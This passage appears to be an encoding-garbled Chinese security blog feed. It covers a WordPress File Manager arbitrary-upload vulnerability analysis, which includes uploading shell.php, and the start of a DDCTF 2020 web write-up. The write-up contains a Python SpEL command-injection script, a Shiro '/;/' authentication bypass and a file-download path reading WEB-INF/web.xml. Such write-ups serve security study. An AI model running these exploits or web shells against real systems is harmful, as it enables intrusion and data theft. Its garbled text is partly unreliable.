<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908160039652-1599734821833.png" alt="image-20200908160039652"></p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908155954458-1599734824736.png" alt="image-20200908155954458"></p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908155946798-1599734827321.png" alt="image-20200908155946798"></p>
<blockquote>
<p><strong>psï¼šPOSTä¼ å…¥targetå‰ç¼€ä¸åŒçš„åŒºåˆ«</strong></p>
<ul>
<li>å‰ç¼€ä¸º<code>l1_</code>æ—¶ï¼Œ<code>$this-&gt;root</code> ä¸º<code>C:\Users\admin\phpstudy_pro\WWW\wordpress\wp-content\plugins\wp-file-manager\lib\files</code></li>
</ul>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908161235911-1599734830148.png" alt="image-20200908161235911"></p>
<ul>
<li>å‰ç¼€ä¸º<code>t1_</code>æ—¶ï¼Œ<code>$this-&gt;disabled[]</code>åŒ…å«<code>upload</code>ï¼Œç¨‹åºä¼šæŠ¥é”™ç»“æŸï¼Œ<code>$this-&gt;root</code> ä¸º<code>C:\Users\admin\phpstudy_pro\WWW\wordpress\wp-content\plugins\wp-file-manager\lib\files\.trash</code></li>
</ul>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908160836714-1599734833086.png" alt="image-20200908160836714"></p>
</blockquote>
<p>ç»§ç»­åˆ†æç¨‹åºæµç¨‹ï¼Œ<code>decode()</code>å‡½æ•°ä¼šè¿”å›<code>C:\Users\admin\phpstudy_pro\WWW\wordpress\wp-content\plugins\wp-file-manager\lib\files</code>,ç„¶åè°ƒç”¨<code>stat()</code>å‡½æ•°ã€‚</p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908153733922-1599734838249.png" alt="image-20200908153733922"></p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908162459331-1599734840447.png" alt="image-20200908162459331"></p>
<p>è¿”å›çš„<code>$ret</code>ä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [isowner] =&gt; </span><br><span class="line">    [ts] =&gt; <span class="number">1589423646</span></span><br><span class="line">    [mime] =&gt; directory</span><br><span class="line">    [read] =&gt; <span class="number">1</span></span><br><span class="line">    [write] =&gt; <span class="number">1</span></span><br><span class="line">    [size] =&gt; <span class="number">0</span></span><br><span class="line">    [hash] =&gt; l1_Lw</span><br><span class="line">    [name] =&gt; files</span><br><span class="line">    [rootRev] =&gt; </span><br><span class="line">    [options] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">            [path] =&gt; </span><br><span class="line">            [url] =&gt; /wordpress/wp-content/plugins/wp-file-manager/lib/php/../files/</span><br><span class="line">            [tmbUrl] =&gt; /wordpress/wp-content/plugins/wp-file-manager/lib/php/../files/.tmb/</span><br><span class="line">            [disabled] =&gt; <span class="keyword">Array</span></span><br><span class="line">                (</span><br><span class="line">                    [<span class="number">0</span>] =&gt; chmod</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">            [separator] =&gt; \</span><br><span class="line">            [copyOverwrite] =&gt; <span class="number">1</span></span><br><span class="line">            [uploadOverwrite] =&gt; <span class="number">1</span></span><br><span class="line">            [uploadMaxSize] =&gt; <span class="number">9223372036854775807</span></span><br><span class="line">            [uploadMaxConn] =&gt; <span class="number">3</span></span><br><span class="line">            [uploadMime] =&gt; <span class="keyword">Array</span></span><br><span class="line">                (</span><br><span class="line">                    [firstOrder] =&gt; deny</span><br><span class="line">                    [allow] =&gt; <span class="keyword">Array</span></span><br><span class="line">                        (</span><br><span class="line">                            [<span class="number">0</span>] =&gt; all</span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">                    [deny] =&gt; <span class="keyword">Array</span></span><br><span class="line">                        (</span><br><span class="line">                            [<span class="number">0</span>] =&gt; all</span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">            [dispInlineRegex] =&gt; ^(?:(?:video|audio)|image/(?!.+\+xml)|application/(?:ogg|x-mpegURL|dash\+xml)|(?:text/plain|application/pdf)$)</span><br><span class="line">            [jpgQuality] =&gt; <span class="number">100</span></span><br><span class="line">            [archivers] =&gt; <span class="keyword">Array</span></span><br><span class="line">                (</span><br><span class="line">                    [create] =&gt; <span class="keyword">Array</span></span><br><span class="line">                        (</span><br><span class="line">                            [<span class="number">0</span>] =&gt; application/x-tar</span><br><span class="line">                            [<span class="number">1</span>] =&gt; application/zip</span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">                    [extract] =&gt; <span class="keyword">Array</span></span><br><span class="line">                        (</span><br><span class="line">                            [<span class="number">0</span>] =&gt; application/x-tar</span><br><span class="line">                            [<span class="number">1</span>] =&gt; application/zip</span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">                    [createext] =&gt; <span class="keyword">Array</span></span><br><span class="line">                        (</span><br><span class="line">                            [application/x-tar] =&gt; tar</span><br><span class="line">                            [application/zip] =&gt; zip</span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">            [uiCmdMap] =&gt; <span class="keyword">Array</span></span><br><span class="line">                (</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">            [syncChkAsTs] =&gt; <span class="number">1</span></span><br><span class="line">            [syncMinMs] =&gt; <span class="number">10000</span></span><br><span class="line">            [i18nFolderName] =&gt; <span class="number">0</span></span><br><span class="line">            [tmbCrop] =&gt; <span class="number">1</span></span><br><span class="line">            [tmbReqCustomData] =&gt; </span><br><span class="line">            [substituteImg] =&gt; <span class="number">1</span></span><br><span class="line">            [onetimeUrl] =&gt; <span class="number">1</span></span><br><span class="line">            [trashHash] =&gt; t1_Lw</span><br><span class="line">            [csscls] =&gt; elfinder-navbar-root-local</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [volumeid] =&gt; l1_</span><br><span class="line">    [locked] =&gt; <span class="number">1</span></span><br><span class="line">    [isroot] =&gt; <span class="number">1</span></span><br><span class="line">    [phash] =&gt; </span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>è¿”å›<code>dir()</code>å‡½æ•°ï¼Œç„¶ååœ¨è¿”å›åˆ°<code>upload()</code>å‡½æ•°ï¼Œå°†è¿”å›å€¼èµ‹ç»™<code>upload()</code>å‡½æ•°ä¸­çš„<code>$dir</code>å˜é‡ï¼Œ</p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908172728778-1599734848077.png" alt="image-20200908172728778"></p>
<p>ç„¶åè¿›è¡Œ<code>mime</code>çš„åˆ¤æ–­ï¼Œç¨‹åºè¯†åˆ«ä¸Šä¼ çš„phpè„šæœ¬çš„<code>mime</code>ä¸º<code>text/x-php</code>ï¼Œè·Ÿè¿›<code>allowPutMime()</code>å‡½æ•°ï¼Œ</p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908175400724-1599734850961.png" alt="image-20200908175400724"></p>
<p>ä»ç¨‹åºè‡ªå¸¦çš„æ³¨é‡Šä¸­å¯ä»¥çœ‹å‡ºå¦‚æœ<code>uploadOrder</code>æ•°ç»„ä¸º<code>array(&#39;deny&#39;,&#39;allow&#39;)</code>ï¼Œåˆ™é»˜è®¤æ—¶å…è®¸ä¸Šä¼ çš„<code>mime</code>ã€‚ç„¶åè·å–æ–‡ä»¶çš„å¤§å°ï¼Œè‹¥æ–‡ä»¶å¤§å°ä¸åˆæ³•æŠ¥é”™ç»“æŸç¨‹åºï¼Œä¹‹å<code>decode()</code>å¤„ç†<code>$dst</code>(<strong><code>POST</code>ä¼ å…¥çš„<code>target</code>å€¼</strong>)èµ‹ç»™<code>$dstpath</code>ï¼Œå› ä¸º<code>$hash</code>ä¸ºç©ºæ•°ç»„ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨<code>joinPathCE()</code>å°†<code>$dstpath</code>å’Œ<code>$name</code>(<strong>ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶å</strong>)æ‹¼æ¥ï¼Œç„¶åæ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨ã€‚</p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908180818104-1599734854769.png" alt="image-20200908180818104"></p>
<p>æœ€åè°ƒç”¨<code>$this-&gt;saveCE()</code></p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908181044918-1599734857093.png" alt="image-20200908181044918"></p>
<p>è·Ÿè¿›<code>_save()</code>ã€‚</p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908181932277-1599734861053.png" alt="image-20200908181932277"></p>
<p>æœ¬åœ°æ—¶åˆ©ç”¨Windowsç³»ç»Ÿåˆ†æï¼Œ<code>$path</code>ä¸º<code>C:\Users\admin\phpstudy_pro\WWW\wordpress\wp-content\plugins\wp-file-manager\lib\files\shell.php</code>;<code>$uri</code>ä¸º<code>C:\Windows\phpxxxx.tmp</code>ï¼Œæœ€åä¼šè°ƒç”¨<code>copy()</code>å°†ä¸Šä¼ çš„æ–‡ä»¶å¤åˆ¶åˆ°<code>\wordpress\wp-content\plugins\wp-file-manager\lib\files\shell.php</code>ï¼Œå³å®Œæˆäº†ä»»æ„æ–‡ä»¶ä¸Šä¼ ã€‚</p>
<img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908184402757.png" alt="image-20200908184402757" style="zoom:150%;">

<h1 id="0x02-æ¼æ´åˆ©ç”¨"><a href="#0x02-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x02 æ¼æ´åˆ©ç”¨"></a>0x02 æ¼æ´åˆ©ç”¨</h1><p>åˆ©ç”¨burpå‘åŒ…</p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908183438085-1599734867412.png" alt="image-20200908183438085"></p>
<p>è®¿é—®<a href="http://192.168.43.44/wordpress/wp-content/plugins/wp-file-manager/lib/files/shell.php" target="_blank" rel="noopener">http://192.168.43.44/wordpress/wp-content/plugins/wp-file-manager/lib/files/shell.php</a></p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908183522240-1599734870037.png" alt="image-20200908183522240"></p>
<h1 id="0x03-æ¼æ´ä¿®å¤"><a href="#0x03-æ¼æ´ä¿®å¤" class="headerlink" title="0x03 æ¼æ´ä¿®å¤"></a>0x03 æ¼æ´ä¿®å¤</h1><blockquote>
<p>å½±å“èŒƒå›´</p>
<p>file manager 6.0è‡³6.8</p>
</blockquote>
<p>å®˜æ–¹ä¿®å¤åˆ é™¤äº†connector.minimal.phpå’Œconnector.minimal.php-distæ–‡ä»¶ã€‚</p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908183148666-1599734873382.png" alt="image-20200908183148666"></p>
<p>å¢åŠ äº†.htaccessã€‚</p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908183049056-1599734876220.png" alt="image-20200908183049056"></p>
<p>å‚è€ƒ:</p>
<p><a href="https://cn-sec.com/archives/117417.html" target="_blank" rel="noopener">ç´§æ€¥ï¼WordPressæ–‡ä»¶ç®¡ç†å™¨æ’ä»¶çˆ†ä¸¥é‡0dayæ¼æ´</a></p>
]]></content>
      <tags>
        <tag>wordpress</tag>
      </tags>
  </entry>
  <entry>
    <title>2020DDCTFwebé¢˜ç›®</title>
    <url>/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/</url>
    <content><![CDATA[<p>è¶ç¯å¢ƒè¿˜æ²¡å…³ï¼Œèµ¶ç´§å¤ç°</p>
<a id="more"></a>

<h1 id="0x01-web-ç­¾åˆ°é¢˜"><a href="#0x01-web-ç­¾åˆ°é¢˜" class="headerlink" title="0x01 web ç­¾åˆ°é¢˜"></a>0x01 web ç­¾åˆ°é¢˜</h1><p>åˆ©ç”¨c-jwt-crackerå¯ä»¥çˆ†ç ´å‡ºjwtå¯†é’¥ï¼Œ</p>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200904201412608-1599460818427.png" alt="image-20200904201412608"></p>
<p>ç„¶åä¼ªé€ jwt-token</p>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200904201350339-1599460818429.png" alt="image-20200904201350339"></p>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200904201328523.png" alt="image-20200904201328523"></p>
<p>ä¸‹è½½åˆ°clientã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export http_ptoxy&#x3D;127.0.0.1:8080</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907172631133.png" alt="image-20200907172631133"></p>
<p>burpæŠ“åŒ…</p>
<img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907172709427.png" alt="image-20200907172709427" style="zoom:150%;">

<p>é€†å‘clientï¼Œwebç‹—ä¸ä¼šé€†å‘ï¼Œçœ‹wpè¯´æ˜¯ç”¨çš„ HMAC sha256åŠ å¯†ï¼Œå¯†é’¥æ˜¯DDCTFWithYouã€‚</p>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907185108863.png" alt="image-20200907185108863"></p>
<p>éªŒè¯ï¼š</p>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907190017072.png" alt="image-20200907190017072"></p>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907185932978.png" alt="image-20200907185932978"></p>
<p>èµ›åçœ‹wpçŸ¥é“æ˜¯spelï¼Œå‚è€ƒ<a href="https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/#Overwrite-Me" target="_blank" rel="noopener">l3yx</a>çš„è„šæœ¬</p>
<blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSignature</span><span class="params">(command,time)</span>:</span></span><br><span class="line">    command=urllib.parse.quote(command)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"Host"</span>: <span class="string">"1024tools.com"</span>,</span><br><span class="line">        <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">"https://1024tools.com/hmac"</span></span><br><span class="line">    data=<span class="string">"query="</span>+command+<span class="string">"|"</span>+time+<span class="string">"&amp;algo=sha256&amp;key=DDCTFWithYou"</span></span><br><span class="line">    res = requests.post(url=url,headers=headers,data=data)</span><br><span class="line"></span><br><span class="line">    r=re.compile(<span class="string">'B:ï¼ˆHMAC(.*?)&lt;textarea class="form-control" id="result_base64" rows="2" spellcheck="false" name="result" cols="50"&gt;(.*?)&lt;/textarea&gt;'</span>,re.DOTALL)</span><br><span class="line">    <span class="keyword">return</span> r.search(res.text).group(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendCommand</span><span class="params">(command,time)</span>:</span></span><br><span class="line">    signature = getSignature(command,time)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"Host"</span>: <span class="string">"117.51.136.197"</span>,</span><br><span class="line">        <span class="string">"Content-Type"</span>: <span class="string">"application/json"</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">"http://117.51.136.197/server/command"</span></span><br><span class="line">    data = <span class="string">'&#123;"signature":"'</span>+signature+<span class="string">'","command":"'</span>+command+<span class="string">'","timestamp":'</span>+time+<span class="string">'&#125;'</span></span><br><span class="line"></span><br><span class="line">    res = requests.post(url=url,headers=headers,data=data)</span><br><span class="line">    <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line">command = <span class="string">"T(java.nio.file.Files).lines(T(java.nio.file.Paths).get('/home/dc2-user/flag/flag.txt'))"</span></span><br><span class="line">command = <span class="string">"new java.util.Scanner(new java.io.File('/home/dc2-user/flag/flag.txt')).next()"</span></span><br><span class="line">print(sendCommand(command,str(int(time.time()))))</span><br></pre></td></tr></table></figure>
</blockquote>
<img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907190221623.png" alt="image-20200907190221623" style="zoom:150%;">



<h1 id="0x02-å¡ç‰‡å•†åº—"><a href="#0x02-å¡ç‰‡å•†åº—" class="headerlink" title="0x02 å¡ç‰‡å•†åº—"></a>0x02 å¡ç‰‡å•†åº—</h1><p>å¯ä»¥å€Ÿå¡ç‰‡ï¼Œå¦‚æœå€Ÿ2çš„61æ¬¡æ–¹ä¼šæº¢å‡ºï¼Œå¯¼è‡´è¿˜ä¸¤å¼ å³å¯ï¼Œç­‰40ç§’ï¼Œå°±ä¼šæ¢å®Œï¼Œå¯ä»¥å…‘æ¢ç¤¼ç‰©ã€‚</p>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907190752097.png" alt="image-20200907190752097"></p>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907191016881.png" alt="image-20200907191016881"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">æŸç¤¼ç‰©å•†åº—æ­£åœ¨åšæ´»åŠ¨ï¼Œ100å¼ å¡ç‰‡å¯å…‘æ¢ç¤¼ç‰©ï¼Œä½ èƒ½å¸®å°æ˜æ¢åˆ°ä»–æƒ³è¦çš„ç¤¼ç‰©å—ï¼Ÿè§„åˆ™å¦‚ä¸‹ï¼š</span><br><span class="line">1. æˆªæ­¢2020-09-04 08:55:34ä¹‹å‰ï¼Œæ¯20ç§’ä¼šå…è´¹è·å¾—1å¼ å¡ç‰‡ï¼Œä¸”å¯è¿›è¡Œç¤¼ç‰©å…‘æ¢ã€‚</span><br><span class="line">2. å¯éšæ—¶å‘æœ‹å‹äº’å€Ÿå¡ç‰‡ã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">å°æ˜ç›®å‰æ‰‹ä¸Šæœ‰4611686018427387706å¼ å¡ç‰‡ã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">æ­å–œä½ ï¼Œä¹°åˆ°äº†ç¤¼ç‰©ï¼Œé‡Œé¢æœ‰å¤¹å¿ƒé¥¼å¹²ã€æœæ¾å­é…’å’Œä¸€å¼ å°çº¸æ¡ï¼Œçº¸æ¡ä¸Šé¢å†™ç€ï¼šurl: &#x2F;flag , SecKey: Udc13VD5adM_c10nPxFu@v12ï¼Œä½ èƒ½çœ‹æ‡‚å®ƒçš„å«ä¹‰å—ï¼Ÿ</span><br></pre></td></tr></table></figure>

<p>çœ‹cookieï¼Œé€šè¿‡æœç´¢å¯ä»¥çŸ¥é“ä¸ºgoçš„Gorilla session</p>
<p>åˆ©ç”¨è¿™ä¸ª<a href="https://github.com/EddieIvan01/secure-cookie-faker/releases/tag/v0.3.2" target="_blank" rel="noopener">å·¥å…·</a>ä¼ªé€ cookie,</p>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200904195829476.png" alt="image-20200904195829476"></p>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200904195946296.png" alt="image-20200904195946296"></p>
<h1 id="0x03-easy-web"><a href="#0x03-easy-web" class="headerlink" title="0x03 easy web"></a>0x03 easy web</h1><p>æˆªåŒ…å¯ä»¥å‘ç°rememberme,å¯ä»¥ç¡®å®šæ˜¯shiro</p>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907145411924.png" alt="image-20200907145411924"></p>
<p>ç„¶åç”¨xrayï¼Œå¸¸è§çš„å¯†é’¥ä¹Ÿæ²¡æœ‰è·‘å‡ºæ¥ï¼Œçœ‹wpåçŸ¥é“æ˜¯<a href="https://l3yx.github.io/2020/06/30/Shiro-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2020-11989/" target="_blank" rel="noopener">shiroçš„æƒé™ç»•è¿‡æ¼æ´</a>,ç”¨/;/å¯ä»¥ç»•è¿‡è®¤è¯ã€‚</p>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907145557582.png" alt="image-20200907145557582"></p>
<p>å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ã€‚</p>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907145759976.png" alt="image-20200907145759976"></p>
<p>/34867ccfda85234382210155be32525c/;/web/img?img=WEB-INF/web.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">web-app</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">"http://java.sun.com/dtd/web-app_2_3.dtd"</span> &gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://java.sun.com/xml/ns/javaee"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"3.0"</span> <span class="attr">metadata-complete</span>=<span class="string">"false"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Archetype Created Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span></span><br><span class="line">      classpath:spring-core.xml</span><br><span class="line">    <span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.util.WebAppRootListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.util.IntrospectorCleanupListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springmvc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:spring-web.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springmvc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>forceEncoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encodingFilter<span class="tag">&lt;/<span 